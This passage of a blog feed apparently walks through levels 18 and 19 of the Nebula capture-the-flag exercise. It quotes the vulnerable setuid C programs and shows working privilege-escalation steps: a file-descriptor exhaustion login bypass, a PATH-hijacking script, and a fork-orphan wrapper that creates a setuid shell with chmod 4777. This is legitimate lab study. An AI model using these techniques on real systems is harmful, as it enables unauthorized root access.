+  dprintf(&amp;ldquo;logged in successfully (with%s password file)\n&amp;rdquo;,
+      fp == NULL ? &amp;ldquo;out&amp;rdquo; : &amp;ldquo;&amp;rdquo;);&lt;/p&gt;
+
+&lt;p&gt;globals.loggedin = 1;&lt;/p&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;void notsupported(char *what)
+{
+  char *buffer = NULL;
+  asprintf(&amp;amp;buffer, &amp;ldquo;&amp;ndash;&amp;gt; [%s] is unsupported at this current time.\n&amp;rdquo;, what);
+  dprintf(what);
+  free(buffer);
+}&lt;/p&gt;
+
+&lt;p&gt;void setuser(char *user)
+{
+  char msg[128];&lt;/p&gt;
+
+&lt;p&gt;sprintf(msg, &amp;ldquo;unable to set user to &amp;lsquo;%s&amp;rsquo; &amp;ndash; not supported.\n&amp;rdquo;, user);
+  printf(&amp;ldquo;%s\n&amp;rdquo;, msg);&lt;/p&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv, char **envp)
+{
+  char c;&lt;/p&gt;
+
+&lt;p&gt;while((c = getopt(argc, argv, &amp;ldquo;d:v&amp;rdquo;)) != -1) {
+      switch&amp;copy; {
+          case &amp;rsquo;d&amp;rsquo;:
+              globals.debugfile = fopen(optarg, &amp;ldquo;w+&amp;rdquo;);
+              if(globals.debugfile == NULL) err(1, &amp;ldquo;Unable to open %s&amp;rdquo;, optarg);
+              setvbuf(globals.debugfile, NULL, _IONBF, 0);
+              break;
+          case &amp;lsquo;v&amp;rsquo;:
+              globals.verbose++;
+              break;
+      }
+  }&lt;/p&gt;
+
+&lt;p&gt;dprintf(&amp;ldquo;Starting up. Verbose level = %d\n&amp;rdquo;, globals.verbose);&lt;/p&gt;
+
+&lt;p&gt;setresgid(getegid(), getegid(), getegid());
+  setresuid(geteuid(), geteuid(), geteuid());&lt;/p&gt;
+
+&lt;p&gt;while(1) {
+      char line[256];
+      char *p, *q;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  q = fgets(line, sizeof(line)-1, stdin);
+  if(q == NULL) break;
+  p = strchr(line, &#39;\n&#39;); if(p) *p = 0;
+  p = strchr(line, &#39;\r&#39;); if(p) *p = 0;
+
+  dvprintf(2, &amp;quot;got [%s] as input\n&amp;quot;, line);
+
+  if(strncmp(line, &amp;quot;login&amp;quot;, 5) == 0) {
+      dvprintf(3, &amp;quot;attempting to login\n&amp;quot;);
+      login(line + 6);
+  } else if(strncmp(line, &amp;quot;logout&amp;quot;, 6) == 0) {
+      globals.loggedin = 0;
+  } else if(strncmp(line, &amp;quot;shell&amp;quot;, 5) == 0) {
+      dvprintf(3, &amp;quot;attempting to start shell\n&amp;quot;);
+      if(globals.loggedin) {
+          execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
+          err(1, &amp;quot;unable to execve&amp;quot;);
+      }
+      dprintf(&amp;quot;Permission denied\n&amp;quot;);
+  } else if(strncmp(line, &amp;quot;logout&amp;quot;, 4) == 0) {
+      globals.loggedin = 0;
+  } else if(strncmp(line, &amp;quot;closelog&amp;quot;, 8) == 0) {
+      if(globals.debugfile) fclose(globals.debugfile);
+      globals.debugfile = NULL;
+  } else if(strncmp(line, &amp;quot;site exec&amp;quot;, 9) == 0) {
+      notsupported(line + 10);
+  } else if(strncmp(line, &amp;quot;setuser&amp;quot;, 7) == 0) {
+      setuser(line + 8);
+  }
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;return 0;
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+Ok. Not so small then. This program took a while to work through. Initially the vulnerability was not so obvious. I could figure out that a few flags were setting a few things inside the global struct and that a password file exists. If I was able to read the password, then I could be marked as logged in and eventually get to the line that does `execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);`.
+
+I noticed the buffer overflow and format string vulnerabilities, but considering the binary was compiled with SSP, partial RELO, and a NX stack, I figured that memory corruption was not necessarily the way to complete this one.
+
+Lots of toying around with the program eventually got me to realize the flaw. If for some reason the program was not able to read the password file successfully, it would just log us in. The password file is `/home/flag18/password` and we don’t have the required permissions to move it or something. I suppose that would have been too easy anyways ;p
+
+So what do we have left? I had to poke around and think about conditions that could make opening a file fail. Eventually I remembered about maximum file descriptors and figured it was worth a shot. What motivated this thinking was the fact that the binary has a `closelog` command too. So, I started to play around with `ulimit`, gradually reducing `-n` until I got to the value 4 as the one that would let me log in due to the fact that the password file could no longer being able to be read; This thanks to the maximum open files limit being reached.
+
+Without setting the max open files, a sample run would be:
+
+```bash
+level18@nebula:~$ touch /tmp/log
+level18@nebula:~$ tail -f /tmp/log &amp;amp;
+[1] 6499
+
+level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
+Starting up. Verbose level = 3
+login egg
+got [login egg] as input
+attempting to login
+shell
+got [shell] as input
+attempting to start shell
+Permission denied
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Dropping the max open files to 4 though, we get:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ulimit -n 4
+
+level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
+-sh: start_pipeline: pgrp pipe: Too many open files
+tail: /tmp/log: file truncated
+Starting up. Verbose level = 3
+login egg
+got [login egg] as input
+attempting to login
+logged in successfully (without password file)
+shell
+got [shell] as input
+attempting to start shell
+/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Login worked :) We can also now call the shell command however the max open files thing looks like a problem. Luckily the binary had that &lt;code&gt;closelog&lt;/code&gt; command that will free up a file descriptor. Rerunning the above but calling &lt;code&gt;closelog&lt;/code&gt; before we call &lt;code&gt;shell&lt;/code&gt; results in:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ~flag18/flag18 -vvv -d /tmp/log
+-sh: start_pipeline: pgrp pipe: Too many open files
+tail: /tmp/log: file truncated
+Starting up. Verbose level = 3
+login egg
+got [login egg] as input
+attempting to login
+logged in successfully (without password file)
+closelog
+got [closelog] as input
+shell
+/home/flag18/flag18: -d: invalid option
+Usage:  /home/flag18/flag18 [GNU long option] [option] ...
+    /home/flag18/flag18 [GNU long option] [option] script-file ...
+GNU long options:
+    --debug
+    --debugger
+    --dump-po-strings
+    --dump-strings
+    --help
+    --init-file
+    --login
+    --noediting
+    --noprofile
+    --norc
+    --posix
+    --protected
+    --rcfile
+    --restricted
+    --verbose
+    --version
+Shell options:
+    -irsD or -c command or -O shopt_option      (invocation only)
+    -abefhkmnptuvxBCHP or -o option
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Examining the error we get now together with the source code, it was clear that the arguments sent to the &lt;code&gt;flag18&lt;/code&gt; binary was also passed to the &lt;code&gt;execve()&lt;/code&gt; call. That means that the error is actually sourced from the fact that &lt;code&gt;sh&lt;/code&gt; has no &lt;code&gt;-d&lt;/code&gt; flag. In fact, one could replicate this error by simply calling &lt;code&gt;sh -d&lt;/code&gt;. This called for some more man page reading once again. I realized later that the error may have also been a sort of hint based on the fact that the &lt;em&gt;GNU long options&lt;/em&gt; are shown. &lt;code&gt;--rcfile&lt;/code&gt; seemed like a good option as it would allow me to specify a type of init script to run. I had a number of attempts to try get this into something workable. Eventually the only file I could get it to load was the logfile I was specifying when running &lt;code&gt;flag18&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
+-sh: start_pipeline: pgrp pipe: Too many open files
+/home/flag18/flag18: invalid option -- &#39;-&#39;
+/home/flag18/flag18: invalid option -- &#39;r&#39;
+/home/flag18/flag18: invalid option -- &#39;c&#39;
+/home/flag18/flag18: invalid option -- &#39;f&#39;
+/home/flag18/flag18: invalid option -- &#39;i&#39;
+/home/flag18/flag18: invalid option -- &#39;l&#39;
+/home/flag18/flag18: invalid option -- &#39;e&#39;
+tail: /tmp/log: file truncated
+Starting up. Verbose level = 3
+login egg
+got [login egg] as input
+attempting to login
+logged in successfully (without password file)
+closelog
+got [closelog] as input
+shell
+/tmp/log: line 1: Starting: command not found
+/tmp/log: line 2: got: command not found
+/tmp/log: line 3: attempting: command not found
+/tmp/log: line 4: syntax error near unexpected token `(&#39;
+/tmp/log: line 4: `logged in successfully (without password file)&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The line &lt;code&gt;Starting: command not found&lt;/code&gt; was as close as I could get to some form of controlled command execution. So, I created this file, exported it into my &lt;code&gt;PATH&lt;/code&gt; and used it to prepare a small SETUID C shell.&lt;/p&gt;
+
+&lt;p&gt;So, to solve level18:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level18@nebula:~$ vim /var/tmp/Starting
+level18@nebula:~$ chmod +x /var/tmp/Starting
+level18@nebula:~$ cat /var/tmp/Starting
+#!/bin/sh
+/bin/sh
+
+level18@nebula:~$ tail -f /tmp/log &amp;amp;
+[1] 7627
+
+level18@nebula:~$ Starting up. Verbose level = 3
+got [login egg] as input
+attempting to login
+logged in successfully (without password file)
+got [closelog] as input
+
+level18@nebula:~$ export PATH=/var/tmp:$PATH
+level18@nebula:~$ ulimit -n 4
+
+level18@nebula:~$ ~flag18/flag18 --rcfile -d /tmp/log -vvv
+-sh: start_pipeline: pgrp pipe: Too many open files
+/home/flag18/flag18: invalid option -- &#39;-&#39;
+/home/flag18/flag18: invalid option -- &#39;r&#39;
+/home/flag18/flag18: invalid option -- &#39;c&#39;
+/home/flag18/flag18: invalid option -- &#39;f&#39;
+/home/flag18/flag18: invalid option -- &#39;i&#39;
+/home/flag18/flag18: invalid option -- &#39;l&#39;
+/home/flag18/flag18: invalid option -- &#39;e&#39;
+tail: /tmp/log: file truncated
+Starting up. Verbose level = 3
+login egg
+got [login egg] as input
+attempting to login
+logged in successfully (without password file)
+closelog
+got [closelog] as input
+shell
+
+sh-4.2$ getflag
+sh: start_pipeline: pgrp pipe: Too many open files
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;level19:0683a5d670a26d450d97365e52610fb5&#34;&gt;level19&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level19/&#34;&gt;Level19&amp;rsquo;s Description&lt;/a&gt;:
+{% blockquote %}
+There is a flaw in the below program in how it operates.
+{% endblockquote %}&lt;/p&gt;
+
+&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;
+
+&lt;p&gt;```c level19.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/stat.h&gt;&lt;/p&gt;
+
+&lt;p&gt;int main(int argc, char **argv, char **envp)
+{
+  pid_t pid;
+  char buf[256];
+  struct stat statbuf;&lt;/p&gt;
+
+&lt;p&gt;/* Get the parent&amp;rsquo;s /proc entry, so we can verify its user id */&lt;/p&gt;
+
+&lt;p&gt;snprintf(buf, sizeof(buf)-1, &amp;ldquo;/proc/%d&amp;rdquo;, getppid());&lt;/p&gt;
+
+&lt;p&gt;/* stat() it */&lt;/p&gt;
+
+&lt;p&gt;if(stat(buf, &amp;amp;statbuf) == -1) {
+      printf(&amp;ldquo;Unable to check parent process\n&amp;rdquo;);
+      exit(EXIT_FAILURE);
+  }&lt;/p&gt;
+
+&lt;p&gt;/* check the owner id */&lt;/p&gt;
+
+&lt;p&gt;if(statbuf.st_uid == 0) {
+      /* If root started us, it is ok to start the shell */&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;  execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
+  err(1, &amp;quot;Unable to execve&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;}&lt;/p&gt;
+
+&lt;p&gt;printf(&amp;ldquo;You are unauthorized to run this program\n&amp;rdquo;);
+}&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+This one had me completely lost. After studying the functions used, I resorted to getting a hint. Partially reading another walkthrough, I came to the section where it mentions a `fork()` operation on the `flag19` binary. Basically, what it boils down to is the fact that when the process is forked and the parent dies, PID 1 (owned by root) will become the owner causing the checks we have in this binary to fail.
+
+To go about this, we would have to write a small C wrapper that will fork itself. We need to give this wrapper a few seconds after the fork to finish off allowing the forked process to become orphaned. Once the process is in the orphaned state, we can `execv()` the `flag19` binary and prepare a shell :)
+
+So, to solve level19:
+
+```bash
+level19@nebula:/var/tmp$ vim pwn19.c
+level19@nebula:/var/tmp$ cat pwn19.c
+#include&amp;lt;stdio.h&amp;gt;
+#include&amp;lt;unistd.h&amp;gt;
+
+int main(void) {
+
+    pid_t pid = fork();
+
+    if (pid == 0) {
+
+        char *arg[] = { &amp;quot;/bin/sh&amp;quot; , &amp;quot;-c&amp;quot; , &amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag19; chmod 4777 /var/tmp/flag19&amp;quot; , NULL};
+        sleep(2); /* Give the fork 2 sec to orphan */
+        execv(&amp;quot;/home/flag19/flag19&amp;quot;, arg);
+        printf(&amp;quot;Done fork\n&amp;quot;);
+        return 0;
+    }
+
+    printf(&amp;quot;Done parent\n&amp;quot;);
+    return 0;
+}
+
+level19@nebula:/var/tmp$ gcc pwn19.c -o pwn19
+level19@nebula:/var/tmp$ ./pwn19
+Done parent
+
+level19@nebula:/var/tmp$ /var/tmp/flag19
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;conclusion:0683a5d670a26d450d97365e52610fb5&#34;&gt;conclusion&lt;/h2&gt;
+
+&lt;p&gt;Even though many of the levels were really really easy, the latter levels did force me to learn a few new things which was great. I think this is some really good learning material for people new to the scene. Heck, I think I will refer people to this next time they ask about OSCP&amp;hellip; ;)&lt;/p&gt;
+
+&lt;p&gt;As a final touch, my &amp;lsquo;loot&amp;rsquo; in &lt;code&gt;/var/tmp&lt;/code&gt; after finishing the last level:&lt;/p&gt;
+
+&lt;p&gt;{% img &lt;a href=&#34;https://i.imgur.com/JHZHRJD.png&#34;&gt;https://i.imgur.com/JHZHRJD.png&lt;/a&gt; %}&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
